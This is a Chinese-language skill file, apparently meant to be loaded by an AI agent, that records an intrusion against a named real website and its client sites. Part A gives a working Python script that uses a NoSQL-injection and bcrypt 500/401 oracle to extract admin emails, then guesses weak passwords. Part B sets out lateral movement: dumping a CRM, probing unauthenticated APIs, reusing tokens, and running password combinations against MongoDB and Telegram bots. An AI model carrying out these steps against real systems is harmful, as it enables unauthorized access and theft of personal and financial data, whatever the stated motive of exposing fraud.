---
name: nosql-login-oracle
description: Mongoose+bcrypt 登录口的类型冲突 oracle 与灰产建站工厂横向打法。
---

# NoSQL 登录口类型冲突 Oracle + 开发商客户站群横向

> **AI LOAD INSTRUCTION**: 两个互补主题。Part A 是 Mongoose+bcrypt 登录端点的
> 500/401 用户枚举 oracle（比时序侧信道可靠）；Part B 是攻破小开发商主控 CRM 后
> 横向其客户站群（灰产建站工厂画像）的完整方法论。来源：2026-09-01
> earningplaner.com (4.193.188.121) 实战，全程实证。

---

## PART A — bcrypt 类型冲突 Oracle（500/401 用户枚举 → 盲注提邮箱）

### 机制

登录 handler 典型写法：
```javascript
const user = await User.findOne({ email: req.body.email });  // 对象直达查询
...
const ok = await bcrypt.compare(req.body.password, user.password);  // 抛错点
```

- `email` 传对象（`{"$regex":"^admin"}`）→ Mongoose 直接进查询，合法。
- `password` 传空对象 `{}` → 用户**存在**时代码走到 `bcrypt.compare({}, hash)`
  → 抛 `Illegal arguments: object, string` → **HTTP 500**
- 用户**不存在** → 早退 "Invalid credentials" → **HTTP 401**

响应码差（500=存在 / 401=不存在）= 低噪声布尔 oracle。

### 逐字符提取（每字符 1 请求）

```python
import json, urllib.request, ssl, re, string
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
URL = 'https://target/api/admin/login'

def exists(prefix):
    body = {"email": {"$regex": "^" + re.escape(prefix)}, "password": {}}
    req = urllib.request.Request(URL, data=json.dumps(body).encode(),
        headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'})
    try:
        urllib.request.urlopen(req, context=ctx, timeout=10); return False   # 200
    except urllib.error.HTTPError as e:
        return e.code == 500   # 500=用户存在, 401=不存在

known = ""
charset = string.ascii_lowercase + string.digits + "@._-"
while True:
    for c in charset:
        if exists(known + c):
            known += c; print(known); break
    else:
        break
print("FINAL:", known)
```

### 关键陷阱（实战踩过）

1. **只污染 email 不够**：`{"email":{"$ne":null}}` + password 留字符串 →
   存在/不存在都返回 401（密码比较失败早退），oracle 不存在。**必须让
   password 本身成为类型冲突值**（`{}` 最稳，`$ne`/`$gt` 也行）。
2. **时序侧信道会骗你**：本例时序先给出 `<EMAIL-REDACTED>` 假信号
   （~980ms vs 基线 640ms，疑似噪声/慢哈希路径），oracle 才纠正真值为
   `<EMAIL-REDACTED>`。并发负载下时序基线漂移，response-code oracle 优先。
3. **Mongoose Cast 错误是二次确认**：`User validation failed: inviteCode:
   Cast to string failed for value "{'$ne': null}"` 说明操作符值已到达
   schema 层 —— 注入活着，即使该字段不是直接注入点。
4. **真邮箱可能是开发者默认命名**：提取出 `<EMAIL-REDACTED>` 而非
   `<EMAIL-REDACTED>`。拿到真值后立即接小定向字典（本例 `password123`
   第 10 次命中）—— 弱口令优先级铁律。
5. **失效条件**：框架层 cast（对象直接 400/422）；bcrypt 前有预校验；
   Pydantic 严格类型栈（FastAPI）天然免疫。PHP/Node 老栈高发。

### 攻破后续

登录成功 → 检查 Set-Cookie（JWT/签名 cookie）→ 直接 GET 全部
`/api/admin/*` 列表端点 dump 数据 → 本链终点是 CRM 库（客户 PII/项目/
收入流水），见 Part B。

---

## PART B — 灰产建站工厂横向（主控 CRM → 客户站群）

### 画像识别

小开发商一套 Next.js+MongoDB 模板给灰产客户建站。判据：
- 主站是「建站服务商」营销页 + 隐藏 admin CRM（robots.txt Disallow /admin/
  + sitemap 泄露 /xxx-admin/ 后台模块名）
- CRM 项目表 description 直白写着 "stock broker froud website"、casino、
  MLM、matka —— 业务性质自供
- 项目数几十个，混 TG bot（t.me/ 链接）+ Web 站 + workers.dev/pages.dev 部署

### 横向动作序列（按序执行）

1. **dump 项目表**：提取全部 `link` / `description` / `hostingType` 字段
   → 客户站全地图 + 真实业务性质。
2. **DNS 分类**：直连开发商 IP（`hostingType:"Ours"` 的站可能 A 记录直指
   开发商服务器）vs Cloudflare 前置。直连站用 `--resolve` 或 Host 头探测
   同机 vhost；CF 站直连公网。
   - **陷阱**：unknown-Host 探测若返回 200 + 默认站字节数（本例 120579B），
     说明 nginx 不区分 vhost —— Host 头判定失效，只信 DNS 直连记录。
3. **同模板站识别**：赌场类站 `/api/user/settings` 端点常**无鉴权**且含：
   - USDT 收款地址 / UPI ID（资金面证据）
   - `telegramBotAdminId` / `telegramLink`（运营者 TG 身份）
   - **`randomResultPercentage` / `winChance` / `globalWinChance`** ——
     服务器端胜率操纵参数，欺诈定性第一手证据，报告直接引用字段名+数值
     （本例 singleUser:60/allUsers:40，globalWinChance:25）
4. **可注册站直接注册**：开放注册的（二元期权/交易站）注册→登录→探 API
   全链：`/api/me` 字段集（winChance 落在用户文档=每用户可调）、
   `/api/trade` 下单（需 socket.io 实时价，见下）、`/api/kyc` 提交、
   `/api/deposit` 手动渠道（watchpay 类常直接建 PENDING 单）。
5. **TG bot 项目批量探活**：t.me/{bot} 页面 grep title/desc 判死活 →
   活的用 TG 测试号 `/start` 交互（等 15-20s 再读，别急着判死）。

### Next.js SSR 站 API 定位陷阱

- 页面是 Server Component 时，前端 chunk 里**没有** deposit/withdraw API
   路径 —— 别无限猜 `/api/deposit` 类路径，转向公开 settings/config 端点。
- 全量端点提取顺序：登录 chunk（auth 端点）→ 各页面专属 chunk
  （`/_next/static/chunks/app/<page>/page-*.js`）→ buildManifest。
- socket.io 站（实时行情）：`nN=io("https://site",{auth:{token:
  localStorage.getItem("token")}})` —— python-socketio Client 带
  `auth={'token':TOK}`, `transports=['polling']` 连接，`@sio.on('*')`
  捕获全部事件（priceUpdate 行情流常无鉴权）。

### 凭据复用纪律

- 主站 admin 命中 ≠ 客户站命中：各站独立 JWT secret + 独立 admin 库。
  复用测试**一轮即止**（本例主站 token 打 3 站 admin API 全 401
  invalid token），确认隔离后立即转其他向量。
- MongoDB 27017 公网可达但 `listDatabases` code 13 = 已开认证；
  定向组合（app 名 × 弱口令）一轮 40 组内不中即停。

### TG bot 交互陷阱

- bot 不回 /start：可能慢（等 15-20s）或仅群内使用；连续 2 轮无响应再判停。
- **调试残留 bot**：任意消息回显 `[Debug Info] You said: X | Your ID: N |
  Admin Status: false` → 直接暴露 `/login` 管理状态机（密码窗口）。
  定向词表一轮（≤17 次）不中即停。
- **留言转发型 bot**（发啥都回 "delivered to admin"）已退化为 relay，
  无攻击面，立即放弃。
- 客服 bot（"please provide your UID"）是会话标记型，无状态机可注入。

### 二元期权站特有缺陷位

- **结算引擎**：下单（balanceType:"VIRTUAL" 通过、"real" 需余额）后
  endTime 过期数分钟仍 status:"OPEN" → 结算服务挂死 = 吞玩家盈利，
  业务级缺陷直接写报告。
- **entryPrice 校验**：服务端比对手价（"Price mismatch. The market has
  moved"），需从 socket.io 实时价立即下单；价格操纵面已被堵死时不要死磕。
- **winChance 落库**：用户文档带 winChance 字段（注册即 30）+ 全局
  globalWinChance —— 双层胜率操纵铁证。
- mass-assignment：`PUT /api/profile` 传 `winChance`/`realBalance`/
  `accountLevel` → 400 "Invalid updates!" = 白名单校验有效（诚实记录）。

---

## 快速判定表

| 信号 | 判定 | 动作 |
|---|---|---|
| 登录口 email 对象 + password 对象 → 500 | 类型冲突 oracle 存在 | 逐字符提取邮箱 |
| 登录口对象 → 400/422 JSON 校验错 | 框架层 cast，oracle 死 | 转时序/其他向量 |
| `/api/user/settings` 无鉴权 200 | 同模板赌场站 | 提取收款地址+操纵参数 |
| 注册响应含 bcrypt hash + token | 注册开放 | 全 API 链测试 |
| trade endTime 过期仍 OPEN | 结算引擎挂死 | 业务缺陷入报告 |
| bot 回显 `[Debug Info]` | 调试残留 | /login 状态机定向测试 |
| unknown-Host 200 = 默认站 | nginx 不分 vhost | 只信 DNS 直连记录 |

## 相关技能

- `security/nosql-injection` — 操作符注入基础（$ne/$gt/$regex）
- `security/api-recon-and-docs` — JS chunk 端点提取
- `security/business-logic-testing` — 结算/胜率类业务缺陷
- `research/pentest-lessons` — 历史战报经验库（含本案例同类条目）
